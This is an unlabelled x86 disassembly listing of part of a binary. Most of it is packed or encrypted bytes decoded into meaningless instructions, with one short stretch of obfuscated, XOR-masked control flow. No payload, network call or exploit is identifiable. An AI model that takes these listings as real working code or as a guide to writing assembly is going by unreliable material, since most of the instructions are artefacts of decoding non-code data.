  41829f:	cmp    eax,0xe87e9129
  4182a4:	(bad)  
  4182a5:	int    0x80
  4182a7:	retf   0xb321
  4182aa:	mov    esi,0x880aea9f
  4182af:	push   edx
  4182b0:	dec    ebp
  4182b1:	les    edx,FWORD PTR [ecx+0x37]
  4182b4:	stos   DWORD PTR es:[edi],eax
  4182b5:	loopne 0x418238
  4182b7:	push   cs
  4182b8:	in     al,0xe9
  4182ba:	pop    edi
  4182bb:	test   DWORD PTR [ebx],esi
  4182bd:	imul   ebx,DWORD PTR [eax],0x4885f19a
  4182c3:	ins    BYTE PTR es:[edi],dx
  4182c4:	cmp    BYTE PTR [edx+0x5dadcdda],ch
  4182ca:	push   0xca7756ae
  4182cf:	fsubr  QWORD PTR [edx+0x2e4606af]
  4182d5:	int3   
  4182d6:	retf   
  4182d7:	rol    bl,0xd8
  4182da:	xor    BYTE PTR [esi+edx*1+0x13],bh
  4182de:	(bad)  
  4182df:	adc    BYTE PTR [edx+0x44],al
  4182e2:	jp     0x418301
  4182e4:	adc    DWORD PTR [ecx],esp
  4182e6:	xchg   BYTE PTR [eax-0x1a830158],dl
  4182ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182ed:	or     edi,DWORD PTR [edi+0x5]
  4182f0:	push   edi
  4182f1:	sub    al,0xe8
  4182f3:	sahf   
  4182f4:	hlt    
  4182f5:	mov    esp,0xa2895526
  4182fa:	das    
  4182fb:	xlat   BYTE PTR ds:[ebx]
  4182fd:	or     DWORD PTR [eax-0xa085ef8],ebx
  418303:	and    ebx,0x1b
  418306:	ss xchg ecx,eax
  418308:	call   0xcfd9:0x491e6d51
  41830f:	jns    0xbb010cd5
  418315:	in     al,0xaf
  418317:	mov    WORD PTR [ebp+0xbc79cca],es
  41831d:	sahf   
  41831e:	inc    esi
  41831f:	pop    ss
  418320:	cmp    DWORD PTR [ebx],eax
  418322:	sahf   
  418323:	scas   eax,DWORD PTR es:[edi]
  418324:	imul   ecx,DWORD PTR [edx],0xffffffdb
  418327:	(bad)  
  418328:	dec    ebx
  418329:	mov    bl,0x36
  41832b:	test   DWORD PTR [esi],ebx
  41832d:	or     ebp,DWORD PTR [edi-0x43b74f9c]
  418333:	adc    al,0x3f
  418335:	cdq    
  418336:	fidiv  DWORD PTR [edx]
  418338:	jne    0x4183a6
  41833a:	dec    ebx
  41833b:	dec    esi
  41833c:	sub    cl,BYTE PTR ds:0xc5a9a7bf
  418342:	ds and al,0xbd
  418345:	mov    ds:0xa1b1f6e5,al
  41834a:	out    dx,al
  41834b:	adc    BYTE PTR [edx],dl
  41834d:	scas   eax,DWORD PTR es:[edi]
  41834e:	in     al,0x51
  418350:	jo     0x4183bb
  418352:	or     DWORD PTR [esp+eiz*4-0x39],0xffffffa2
  418357:	push   edi
  418358:	gs popa 
  41835a:	jnp    0x418375
  41835c:	repnz push ebx
  41835e:	arpl   WORD PTR [eax],sp
  418360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418361:	rcl    al,cl
  418363:	pop    ebx
  418364:	aam    0xd0
  418366:	call   0x1350:0xd167ffb7
  41836d:	out    0xdd,al
  41836f:	jg     0x4183b5
  418371:	push   edi
  418372:	fs push edi
  418374:	fsubr  QWORD PTR [eax-0x56]
  418377:	retf   0x540a
  41837a:	xchg   edx,eax
  41837b:	add    al,BYTE PTR [edx-0x3fd37170]
  418381:	mov    ecx,0x6f4c64a2
  418386:	push   ss
  418387:	cld    
  418388:	xor    cl,dl
  41838a:	out    0xd7,eax
  41838c:	jbe    0x4183b3
  41838e:	adc    DWORD PTR [edi+ebp*2],esp
  418391:	(bad)  
  418392:	jmp    0x4183c2
  418394:	(bad)  
  418395:	pop    esp
  418396:	dec    esi
  418397:	lods   eax,DWORD PTR ds:[esi]
  418398:	hlt    
  418399:	in     eax,dx
  41839a:	mov    ch,BYTE PTR [edx-0x7cd5e8d0]
  4183a0:	cmp    ah,dh
  4183a2:	or     eax,0xe0411ef2
  4183a7:	mov    esp,0x7385e4b2
  4183ac:	inc    esi
  4183ad:	sbb    al,0x96
  4183af:	jns    0x418383
  4183b1:	aaa    
  4183b2:	cmp    al,0xfa
  4183b4:	loopne 0x41833f
  4183b6:	(bad)  
  4183b7:	sub    eax,0x693304d9
  4183bc:	scas   eax,DWORD PTR es:[edi]
  4183bd:	and    eax,0x367f6e55
  4183c2:	retf   
  4183c3:	dec    eax
  4183c4:	data16 aad 0x15
  4183c7:	dec    edx
  4183c8:	add    DWORD PTR [eax-0x76643d34],ebp
  4183ce:	dec    ebx
  4183cf:	cmp    ch,BYTE PTR [esi-0x5]
  4183d2:	push   esi
  4183d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183d4:	xor    ebx,edx
  4183d6:	push   esp
  4183d7:	add    ebp,DWORD PTR [ecx+eiz*2+0x73]
  4183db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183dc:	(bad)  
  4183dd:	les    edi,FWORD PTR [esi+0x2b5e7f7e]
  4183e3:	je     0x41839e
  4183e5:	pop    ebp
  4183e6:	cmp    al,BYTE PTR [edx+0x47]
  4183e9:	pop    esp
  4183ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183eb:	out    dx,al
  4183ec:	inc    edi
  4183ed:	and    BYTE PTR [eax-0x62],cl
  4183f0:	lods   eax,DWORD PTR ds:[esi]
  4183f1:	xchg   edi,eax
  4183f2:	sub    esi,DWORD PTR [ebp+ebx*4+0x28b98c51]
  4183f9:	jne    0x418435
  4183fb:	dec    edi
  4183fc:	push   ebp
  4183fd:	lds    esp,FWORD PTR [ebp+edx*2+0x25]
  418401:	dec    ebx
  418402:	fst    st(3)
  418404:	xchg   ebp,eax
  418405:	lea    ebp,[eax]
  418407:	js     0x4183b7
  418409:	pop    ebx
  41840a:	mov    al,0x7b
  41840c:	pop    ebp
  41840d:	push   eax
  41840e:	inc    esp
  41840f:	cdq    
  418410:	arpl   WORD PTR [edi+0x56b7f9d5],bp
  418416:	sub    cl,BYTE PTR [esi-0x2f]
  418419:	aas    
  41841a:	lds    esi,FWORD PTR [eax-0x4e]
  41841d:	or     eax,0x9bb333e5
  418422:	mov    bl,0x7d
  418424:	or     al,0xa1
  418426:	sbb    al,0x5
  418428:	out    0x76,al
  41842a:	lods   eax,DWORD PTR ds:[esi]
  41842b:	push   ds
  41842c:	(bad)  
  41842d:	fsub   st(2),st
  41842f:	sub    esp,ebx
  418431:	popf   
  418432:	inc    eax
  418433:	add    BYTE PTR [edi-0x50408b38],al
  418439:	cmp    DWORD PTR ds:0x1ff7f54f,ebp
  41843f:	xchg   esi,eax
  418440:	mov    al,ds:0x691a2bdd
  418445:	imul   ebp,DWORD PTR [esi+ebx*8],0x74
  418449:	or     cl,dl
  41844b:	mov    bh,0x15
  41844d:	ret    
  41844e:	leave  
  41844f:	jle    0x4183d8
  418451:	cmp    BYTE PTR [esi-0x4a],bh
  418454:	xchg   ecx,eax
  418455:	xor    edx,esi
  418457:	dec    ebp
  418458:	jg     0x418426
  41845a:	add    eax,0x3adea9aa
  41845f:	ja     0x418416
  418461:	and    cl,ah
  418463:	jp     0x41846c
  418465:	pusha  
  418466:	in     eax,dx
  418467:	xchg   esp,eax
  418468:	pop    ds
  418469:	repz or DWORD PTR [esi-0x52],ecx
  41846d:	mov    bl,0x65
  41846f:	in     eax,dx
  418470:	es mov ah,0x2b
  418473:	ret    0xbcfc
  418476:	addr16 je 0x4184a3
  418479:	add    al,0x0
  41847b:	sti    
  41847c:	sbb    bl,BYTE PTR [eax]
  41847e:	stc    
  41847f:	xchg   ecx,eax
  418480:	dec    edx
  418481:	or     eax,0x876143d2
  418486:	stc    
  418487:	sahf   
  418488:	loopne 0x4184aa
  41848a:	mov    esi,0xcf7accba
  41848f:	mov    ebx,0x80ebf76a
  418494:	xchg   DWORD PTR [edi-0x7a9c60ae],edi
  41849a:	loopne 0x418444
  41849c:	fnstsw WORD PTR [ebx+0x55]
  41849f:	jmp    DWORD PTR [esp+ebx*8-0x6b5bbaf6]
  4184a6:	scas   al,BYTE PTR es:[edi]
  4184a7:	hlt    
  4184a8:	aaa    
  4184a9:	call   0x9b8fbed3
  4184ae:	jmp    0xff01117e
  4184b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b4:	inc    eax
  4184b5:	stc    
  4184b6:	mov    ecx,0x85e99872
  4184bb:	imul   BYTE PTR [ebx-0x76]
  4184be:	mov    DWORD PTR [ecx+esi*2],edi
  4184c1:	ins    DWORD PTR es:[edi],dx
  4184c2:	out    dx,al
  4184c3:	and    ah,BYTE PTR [ecx-0x66]
  4184c6:	icebp  
  4184c7:	xor    BYTE PTR [edx-0x73],bl
  4184ca:	dec    ebx
  4184cb:	mov    eax,ds:0x97b0686c
  4184d0:	add    al,0xb4
  4184d2:	push   ebp
  4184d3:	int3   
  4184d4:	pop    edx
  4184d5:	inc    eax
  4184d6:	mov    ch,0x17
  4184d8:	and    ah,BYTE PTR [esi-0x18]
  4184db:	pop    edx
  4184dc:	(bad)  
  4184dd:	xor    ecx,ebx
  4184df:	inc    esi
  4184e0:	aad    0x1f
  4184e2:	es stos DWORD PTR es:[edi],eax
  4184e4:	sahf   
  4184e5:	test   BYTE PTR [ebx-0x2d],0xc3
  4184e9:	or     al,0x9d
  4184eb:	cmp    dh,BYTE PTR [eax+ebp*1]
  4184ee:	ins    BYTE PTR es:[edi],dx
  4184ef:	mov    al,ds:0x9a0ed035
  4184f4:	inc    edi
  4184f5:	mov    edi,0xaf3d8915
  4184fa:	mov    ecx,0xde206e30
  4184ff:	out    dx,al
  418500:	dec    ebx
  418501:	mov    esi,0x1c0c2714
  418506:	pop    esi
  418507:	shr    BYTE PTR [ebx],cl
  418509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850b:	(bad)  
  41850c:	cli    
  41850d:	fcom   DWORD PTR [eax-0x69]
  418510:	mov    edi,0x16a31ef8
  418515:	mov    fs,edx
  418517:	cld    
  418518:	jne    0x418528
  41851a:	push   0xffffffc7
  41851c:	adc    DWORD PTR ds:0x8d89960d,edx
  418522:	fwait
  418523:	pusha  
  418524:	not    ebx
  418526:	jo     0x418554
  418528:	cmp    DWORD PTR [ecx+0xe6df879],esi
  41852e:	adc    BYTE PTR [eax+0x147138bf],dh
  418534:	shl    DWORD PTR [edx+0x7d],cl
  418537:	rol    DWORD PTR [eax],0x2a
  41853a:	push   esp
  41853b:	sahf   
  41853c:	lds    ecx,FWORD PTR ds:0x5eb31792
  418542:	lods   eax,DWORD PTR ds:[esi]
  418543:	mov    ch,0x83
  418545:	dec    edi
  418546:	jmp    0x4184e4
  418548:	push   edx
  418549:	mov    bl,0x93
  41854b:	bound  edx,QWORD PTR [ebx+0x5fa40807]
  418551:	inc    ecx
  418552:	jmp    DWORD PTR [edi]
  418554:	adc    BYTE PTR [edi+0x5f],bh
  418557:	or     esi,DWORD PTR [esi]
  418559:	cli    
  41855a:	adc    DWORD PTR ds:0xaf336583,esi
  418560:	ins    BYTE PTR es:[edi],dx
  418561:	mov    esi,0xd781e72e
  418566:	adc    BYTE PTR [ebx-0x17],0x20
  41856a:	add    eax,0x3d5613b8
  41856f:	rol    DWORD PTR [eax],1
  418571:	shl    BYTE PTR [ecx-0x2635678f],cl
  418577:	nop    ecx
  41857a:	push   cs
  41857b:	ins    BYTE PTR es:[edi],dx
  41857c:	jo     0x418507
  41857e:	sub    ch,BYTE PTR [ebx]
  418580:	gs ins DWORD PTR es:[edi],dx
  418582:	loope  0x41858a
  418584:	push   esp
  418585:	sbb    eax,0xaee177c1
  41858a:	xchg   edx,eax
  41858b:	repnz dec esp
  41858d:	dec    ebx
  41858e:	fwait
  41858f:	das    
  418590:	inc    edx
  418591:	xchg   esi,eax
  418592:	sbb    eax,0x31434e45
  418597:	dec    edi
  418598:	not    BYTE PTR [ebx+0x53377e5c]
  41859e:	rcl    DWORD PTR [esi+edi*2-0x34fb4f1e],cl
  4185a5:	mov    ecx,0xd61cbf1b
  4185aa:	fs enter 0x9a8f,0x99
  4185af:	popf   
  4185b0:	mov    eax,0x1a1c5220
  4185b5:	jns    0x418552
  4185b7:	ucomiss xmm2,xmm7
  4185ba:	montmul (bad)
  4185bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185bc:	xchg   DWORD PTR [ecx],ecx
  4185be:	xor    esp,DWORD PTR ds:0x1b1c9397
  4185c4:	(bad)  
  4185c5:	stc    
  4185c6:	xchg   edx,eax
  4185c7:	push   es
  4185c8:	aam    0x3
  4185ca:	push   esp
  4185cb:	ins    BYTE PTR es:[edi],dx
  4185cc:	adc    esi,DWORD PTR [ecx+0x48ac702f]
  4185d2:	mov    es,WORD PTR [edx]
  4185d4:	pop    esi
  4185d5:	sub    edi,DWORD PTR [ecx+0x462925a8]
  4185db:	adc    BYTE PTR [edi-0x75],bl
  4185de:	sbb    BYTE PTR [edi],dl
  4185e0:	mov    ebp,0xbcca1ff9
  4185e5:	gs jp  0x4185fd
  4185e8:	cld    
  4185e9:	push   es
  4185ea:	inc    edx
  4185eb:	out    0x9f,al
  4185ed:	into   
  4185ee:	jno    0x41863f
  4185f0:	loope  0x41862e
  4185f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185f3:	aad    0xfe
  4185f5:	repz push esi
  4185f7:	call   0x41d6d6f1
  4185fc:	ret    
  4185fd:	push   0xea41d782
  418602:	data16 mov al,ds:0x1aea5e96
  418608:	(bad)  
  418609:	pusha  
  41860a:	jns    0x4185e0
  41860c:	xchg   esi,eax
  41860d:	lods   al,BYTE PTR ds:[esi]
  41860e:	fsub   QWORD PTR [edi-0x2ca361d0]
  418614:	mov    dl,0xe0
  418616:	les    ebp,FWORD PTR [esi+0x6ccae2c]
  41861c:	ret    
  41861d:	sub    BYTE PTR [eax-0x3f],0xdb
  418621:	cmp    ax,0xa218
  418625:	mov    DWORD PTR [edx-0x77],esp
  418628:	enter  0xf622,0x35
  41862c:	jecxz  0x418622
  41862e:	pusha  
  41862f:	cld    
  418630:	mov    edi,0x38b1d1b4
  418635:	push   ss
  418636:	inc    esi
  418637:	aad    0xcf
  418639:	arpl   WORD PTR [ebp+eax*2+0x5dae1410],di
  418640:	mov    ch,0xa2
  418642:	fxch   st(5)
  418644:	jb     0x41869f
  418646:	(bad)  
  418647:	xor    al,0xeb
  418649:	retf   
  41864a:	pop    ss
  41864b:	sub    edi,DWORD PTR [eax+ecx*2-0x63c06471]
  418652:	sub    BYTE PTR [edi-0x4cbe80e],bh
  418658:	icebp  
  418659:	xor    al,0xed
  41865b:	or     eax,DWORD PTR [ecx+0x30a007af]
  418661:	add    al,0x30
  418663:	ret    
  418664:	add    ecx,DWORD PTR [edx+edx*1-0x6d]
  418668:	push   cs
  418669:	xchg   ecx,eax
  41866a:	dec    ebp
  41866b:	mov    ?,esi
  41866d:	dec    ebx
  41866e:	and    bl,ch
  418670:	jg     0x41865e
  418672:	mov    edi,0x44a6402a
  418677:	loop   0x41865a
  418679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41867a:	lods   al,BYTE PTR ds:[esi]
  41867b:	int    0x50
  41867d:	dec    eax
  41867e:	repnz sbb DWORD PTR ds:0x9da4b9fc,esi
  418685:	call   0x8347:0x1df62adc
  41868c:	mov    esp,0x9038253a
  418691:	leave  
  418692:	lahf   
  418693:	sub    DWORD PTR [edx+edi*4+0x2e7e8e5c],ebx
  41869a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41869b:	test   edi,0x93369951
  4186a1:	add    DWORD PTR [ecx+0x68],0xfffffff4
  4186a5:	push   ebp
  4186a6:	mov    ss,ebx
  4186a8:	leave  
  4186a9:	pop    edx
  4186aa:	mul    BYTE PTR [ecx]
  4186ac:	gs int 0xc5
  4186af:	dec    ecx
  4186b0:	enter  0x47ae,0x60
  4186b4:	mov    ebx,0xc7171c9b
  4186b9:	loop   0x41865a
  4186bb:	test   al,0x8c
  4186bd:	jbe    0x41870f
  4186bf:	ins    DWORD PTR es:[edi],dx
  4186c0:	sar    ch,0x70
  4186c3:	ins    DWORD PTR es:[edi],dx
  4186c4:	push   es
  4186c5:	in     eax,dx
  4186c6:	sub    DWORD PTR [edi+0x2c1ad73],ebp
  4186cc:	push   0x24e21c45
  4186d1:	mov    bh,BYTE PTR [eax-0x53c7b691]
  4186d7:	shl    DWORD PTR [edi-0x63d292e0],cl
  4186dd:	pop    edi
  4186de:	inc    ebx
  4186df:	or     eax,0x2bd2a233
  4186e4:	dec    ecx
  4186e5:	jno    0x418765
  4186e7:	pop    eax
  4186e8:	lods   eax,DWORD PTR ds:[esi]
  4186e9:	js     0x4186ab
  4186eb:	test   al,0x79
  4186ed:	dec    ebx
  4186ee:	sahf   
  4186ef:	add    esp,DWORD PTR [edx]
  4186f1:	jl     0x418682
  4186f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186f4:	dec    esi
  4186f5:	sub    cl,BYTE PTR [edx+0x5b]
  4186f8:	loopne 0x4186d3
  4186fa:	imul   eax,DWORD PTR [eax],0xffffffec
  4186fd:	pusha  
  4186fe:	xor    al,0x86
  418700:	mul    BYTE PTR [esi-0xf]
  418703:	push   ss
  418704:	test   al,0x1c
  418706:	mov    esp,edx
  418708:	xor    edx,eax
  41870a:	lea    edx,[edx+ebx*1+0x3272e0]
  418711:	mov    DWORD PTR [ebp-0xc],edx
  418714:	mov    edx,DWORD PTR [ebp-0x10]
  418717:	xor    edx,eax
  418719:	add    edx,esi
  41871b:	jne    0x40f646
  418721:	jmp    0x41abbe
  418726:	mov    ecx,DWORD PTR [ebp-0x14]
  418729:	mov    DWORD PTR [ebp+0x8],ecx
  41872c:	jmp    0x4187a5
  418731:	mov    ecx,DWORD PTR [ebp+0x8]
  418734:	mov    edx,DWORD PTR [ebp-0x8]
  418737:	xor    ecx,eax
  418739:	xor    edx,eax
  41873b:	sub    ecx,edx
  41873d:	sub    ecx,esi
  41873f:	xor    ecx,eax
  418741:	mov    DWORD PTR [ebp+0x8],ecx
  418744:	mov    ecx,DWORD PTR [ebp+0x8]
  418747:	mov    edx,DWORD PTR [ebp-0x58]
  41874a:	add    ecx,0x5708f8
  418750:	imul   ecx,edx
  418753:	mov    DWORD PTR [ebp-0x58],ecx
  418756:	mov    ecx,DWORD PTR [ebp+0x8]
  418759:	mov    edx,DWORD PTR [ebp-0x54]
  41875c:	add    ecx,0x64f8da
  418762:	or     ecx,edx
  418764:	mov    DWORD PTR [ebp-0x54],ecx
  418767:	mov    ecx,DWORD PTR [ebp+0x8]
  41876a:	mov    edx,DWORD PTR [ebp-0x50]
  41876d:	add    ecx,0x242ebed
  418773:	xor    ecx,edx
  418775:	mov    DWORD PTR [ebp-0x50],ecx
  418778:	mov    ecx,DWORD PTR [ebp+0x8]
  41877b:	mov    edx,DWORD PTR [ebp-0x4c]
  41877e:	add    ecx,edi
  418780:	and    ecx,edx
  418782:	mov    DWORD PTR [ebp-0x4c],ecx
  418785:	mov    ecx,DWORD PTR [ebp+0x8]
  418788:	mov    edx,DWORD PTR [ebp-0x48]
  41878b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  418792:	mov    DWORD PTR [ebp-0x48],ecx
  418795:	mov    ecx,DWORD PTR [ebp+0x8]
  418798:	mov    edx,0xfa5e15e2
  41879d:	sub    edx,ecx
  41879f:	add    edx,DWORD PTR [ebp-0x44]
  4187a2:	mov    DWORD PTR [ebp-0x44],edx
  4187a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4187a8:	xor    ecx,eax
  4187aa:	add    ecx,esi
  4187ac:	jne    0x418731
  4187b2:	jmp    0x41abca
  4187b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4187ba:	mov    edx,DWORD PTR [ebp-0x8]
  4187bd:	xor    ecx,eax
  4187bf:	xor    edx,eax
  4187c1:	sub    ecx,edx
  4187c3:	sub    ecx,esi
  4187c5:	xor    ecx,eax
  4187c7:	mov    DWORD PTR [ebp+0x8],ecx
  4187ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4187cd:	mov    edx,DWORD PTR [ebp-0x58]
  4187d0:	jmp    0x41ab56
  4187d5:	sub    eax,0x97a551eb
  4187da:	fwait
  4187db:	lods   eax,DWORD PTR ds:[esi]
  4187dc:	fistp  DWORD PTR [edx]
  4187de:	pop    ecx
  4187df:	imul   DWORD PTR [ecx]
  4187e1:	xchg   esi,eax
  4187e2:	mov    esp,0x34ebfd48
  4187e7:	jns    0x418863
  4187e9:	add    DWORD PTR [edi+0x7a],ebx
  4187ec:	jp     0x418802
  4187ee:	pop    ebp
  4187ef:	(bad)  
  4187f0:	imul   edi
  4187f2:	cdq    
  4187f3:	ror    BYTE PTR [edx-0x134ca188],cl
  4187f9:	dec    BYTE PTR [ebx]
  4187fb:	add    DWORD PTR [ebp-0x10],eax
  4187fe:	sbb    eax,0x4a7170d0
  418803:	test   DWORD PTR [ebx+0x27],edi
  418806:	and    al,0x3e
  418808:	jae    0x41882c
  41880a:	je     0x418837
  41880c:	xchg   edi,eax
  41880d:	scas   al,BYTE PTR es:[edi]
  41880e:	mov    ch,0x8e
  418810:	shl    BYTE PTR [ebp-0x54],1
  418813:	mov    dh,0xd2
  418815:	(bad)  
  418816:	pop    ebx
  418817:	call   0x1ea43f6d
  41881c:	mov    edx,0x7574ea57
  418821:	and    eax,0xe4fabef7
  418826:	int3   
  418827:	test   al,0x3a
  418829:	mov    bl,0xbe
  41882b:	adc    esi,ebx
  41882d:	jae    0x418823
  41882f:	xchg   esi,eax
  418830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418831:	cmp    eax,0x9f3517a3
  418836:	mov    edx,0x5b4e7bc4
  41883b:	xor    DWORD PTR [ecx],ebp
  41883d:	mov    cl,0xa6
  41883f:	push   eax
  418840:	add    bl,BYTE PTR [ebp-0x5e55146d]
  418846:	fwait
  418847:	jns    0x41883c
  418849:	dec    edi
  41884a:	push   esi
  41884b:	xor    eax,DWORD PTR [ebx+0x793c5d8b]
  418851:	cmp    al,0x42
  418853:	mov    fs,bx
  418856:	call   FWORD PTR [ecx+eax*2]
  418859:	nop
  41885a:	cmp    cl,BYTE PTR [eax+0x63]
  41885d:	popa   
  41885e:	fsub   st(2),st
  418860:	push   0x898b055
  418865:	outs   dx,BYTE PTR ds:[esi]
  418866:	jle    0x4188c5
  418868:	stos   BYTE PTR es:[edi],al
  418869:	cli    
  41886a:	int3   
  41886b:	sahf   
  41886c:	and    ah,BYTE PTR [ebx+0x660703f2]
  418872:	rep lods eax,DWORD PTR ds:[esi]
  418874:	xchg   ebx,eax
  418875:	ds dec edi
  418877:	xchg   edx,eax
  418878:	mov    eax,0xf9f9cbab
  41887d:	sub    DWORD PTR [ebp-0x50],ecx
  418880:	push   ecx
  418881:	ins    BYTE PTR es:[edi],dx
  418882:	xchg   ebp,eax
  418883:	sub    al,0x18
  418885:	aaa    
  418886:	cld    
  418887:	push   0xfffffff9
  418889:	ins    BYTE PTR es:[edi],dx
  41888a:	push   esp
  41888b:	repz add ch,bh
  41888e:	lds    ebx,FWORD PTR [ebx]
  418890:	adc    BYTE PTR [eax+edx*2],ch
  418893:	ja     0x418869
  418895:	neg    BYTE PTR [esi+0x3813549]
  41889b:	mov    ah,0x7e
  41889d:	mov    al,ds:0x63d64ef6
  4188a2:	addr16 jmp 0x4188c0
  4188a5:	jo     0x4188d8
  4188a7:	and    dl,BYTE PTR [ecx+0x2e]
  4188aa:	in     al,0x16
  4188ac:	or     DWORD PTR [ebx+0x1d],ebp
  4188af:	loope  0x418905
  4188b1:	outs   dx,BYTE PTR ds:[esi]
  4188b2:	int3   
  4188b3:	xchg   DWORD PTR [edi-0x2a6aa2a9],edx
  4188b9:	sbb    eax,0xfd35b0f4
  4188be:	repnz pop edi
  4188c0:	call   0xab48:0xa4e3aed0
  4188c7:	xor    eax,0x74926a62
  4188cc:	mov    ecx,0x48a18a15
  4188d1:	popf   
  4188d2:	adc    ebx,DWORD PTR [ecx-0x3f]
  4188d5:	(bad)  
  4188d6:	jae    0x418910
  4188d8:	aam    0x81
  4188da:	mov    eax,0x898ec4cd
  4188df:	adc    DWORD PTR [esi-0x7a071c2d],ebp
  4188e5:	adc    BYTE PTR [esp+edx*4],0xee
  4188e9:	js     0x4188e7
  4188eb:	pop    ecx
  4188ec:	retf   
  4188ed:	xchg   ecx,eax
  4188ee:	popf   
  4188ef:	cli    
  4188f0:	mov    edi,0x12bfe2b6
  4188f5:	out    0x52,eax
  4188f7:	or     esi,DWORD PTR [edi+0x17d297e0]
  4188fd:	sbb    ebx,DWORD PTR [edx+0x1a9cb55d]
  418903:	mov    DWORD PTR [bx],esi
  418906:	mov    bh,0xaf
  418908:	adc    ebx,DWORD PTR [edi+0x698d23dd]
  41890e:	mov    dh,BYTE PTR [ebx]
  418910:	jnp    0x4188ed
  418912:	push   edx
  418913:	cmp    al,0xfe
  418915:	mov    ebx,0x748ca45f
  41891a:	sbb    al,0x25
  41891c:	retf   0xc556
  41891f:	pushf  
  418920:	int    0x4e
  418922:	bound  esp,QWORD PTR [ecx-0x3]
  418925:	test   DWORD PTR [ebx-0x5e3eb124],eax
  41892b:	and    al,0xfc
  41892d:	stos   DWORD PTR es:[edi],eax
  41892e:	cld    
  41892f:	jbe    0x41898b
  418931:	mov    bh,0x74
  418933:	cdq    
  418934:	ret    0x39a0
  418937:	vpor   xmm2,xmm4,XMMWORD PTR [ebx+0x8e96d2a]
  41893f:	mov    ah,ch
  418941:	dec    ebp
  418942:	push   edx
  418943:	or     al,0xee
  418945:	add    bh,BYTE PTR [eax]
  418947:	stos   DWORD PTR es:[edi],eax
  418948:	adc    al,0x5a
  41894a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41894b:	das    
  41894c:	lods   eax,DWORD PTR ds:[esi]
  41894d:	sti    
  41894e:	sub    eax,0x3e6f6e09
  418953:	test   al,0xf8
  418955:	pushf  
  418956:	sbb    DWORD PTR [esi+0x12],ebp
  418959:	mov    ah,0x25
  41895b:	adc    edi,esp
  41895d:	mov    DWORD PTR [ebx+0x4f],ebp
  418960:	lods   al,BYTE PTR ds:[esi]
  418961:	add    DWORD PTR [edi],ebp
  418963:	xor    eax,0x636710d
  418968:	adc    ch,BYTE PTR ds:0xbab2c9fa
  41896e:	sbb    BYTE PTR [esi+0x40],dl
  418971:	sub    BYTE PTR [edx-0x6fd3a871],dh
  418977:	mov    dh,0xe0
  418979:	and    BYTE PTR [edx+0x21],dl
  41897c:	test   eax,0x64d124af
  418981:	sahf   
  418982:	inc    eax
  418983:	mov    dl,0x99
  418985:	in     al,dx
  418986:	mov    esp,0xf4fe8e8
  41898b:	mov    bl,bh
  41898d:	jl     0x41898d
  41898f:	ja     0x4189fe
  418991:	cmp    DWORD PTR [ebx+0x75],ecx
  418994:	fidiv  DWORD PTR [esi-0xf5093ff]
  41899a:	in     eax,dx
  41899b:	mov    dl,0xac
  41899d:	rcl    BYTE PTR [esi-0x43],0xb3
  4189a1:	lahf   
  4189a2:	bound  esi,QWORD PTR [edx+0xd]
  4189a5:	mov    edi,0x6fa48190
  4189aa:	or     al,0xd7
  4189ac:	sbb    DWORD PTR [esi+0x53],esi
  4189af:	or     ch,BYTE PTR [esi+0x44]
  4189b2:	(bad)  
  4189b3:	inc    eax
  4189b4:	repnz add DWORD PTR [edi-0x58],ebp
  4189b8:	aaa    
  4189b9:	ins    DWORD PTR es:[edi],dx
  4189ba:	add    BYTE PTR [edi-0x16804333],cl
  4189c0:	retf   
  4189c1:	jns    0x4189cd
  4189c3:	cld    
  4189c4:	das    
  4189c5:	test   al,0xef
  4189c7:	xchg   edi,eax
  4189c8:	and    BYTE PTR [ebp+0x58],ah
  4189cb:	in     eax,dx
  4189cc:	retf   
  4189cd:	adc    eax,0x7925216d
  4189d2:	retf   
  4189d3:	sub    DWORD PTR [edx-0x44],esp
  4189d6:	sti    
  4189d7:	mov    al,0x6f
  4189d9:	cli    
  4189da:	dec    eax
  4189db:	inc    ebp
  4189dc:	jmp    0x838327d4
  4189e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189e2:	fs das 
  4189e4:	ins    BYTE PTR es:[edi],dx
  4189e5:	mov    ?,WORD PTR [eax]
  4189e7:	fs inc esi
  4189e9:	nop
  4189ea:	xchg   edi,eax
  4189eb:	dec    ebx
  4189ec:	xchg   ebp,eax
  4189ed:	add    dh,BYTE PTR [ebx]
  4189ef:	sar    DWORD PTR [ecx-0xadd076],0x5b
  4189f6:	and    al,0x5e
  4189f8:	(bad)  
  4189f9:	shr    BYTE PTR [eax+edx*1-0x451ee5c8],1
  418a00:	mov    bl,0xb7
  418a02:	xchg   ebx,eax
  418a03:	adc    al,0x7e
  418a05:	pop    esi
  418a06:	or     BYTE PTR [ebp+0x72e3e8e9],ch
  418a0c:	pop    ebx
  418a0d:	jo     0x418995
  418a0f:	and    cl,BYTE PTR [ebp-0x4394f26f]
  418a15:	mov    ds:0x47184cd2,eax
  418a1a:	test   DWORD PTR [edx],esi
  418a1c:	out    0x64,eax
  418a1e:	aad    0x48
  418a20:	in     al,0x5e
  418a22:	daa    
  418a23:	call   0xa859:0x37b2fcf2
  418a2a:	jg     0x418a9a
  418a2c:	add    BYTE PTR [ecx-0x2a],cl
  418a2f:	test   eax,0x5a6f852e
  418a34:	call   0xa97639f0
  418a39:	stc    
  418a3a:	or     al,0x60
  418a3c:	div    DWORD PTR [edi-0x70]
  418a3f:	or     BYTE PTR [ebx-0x7b91519e],bh
  418a45:	or     cl,BYTE PTR ds:0xacf82aba
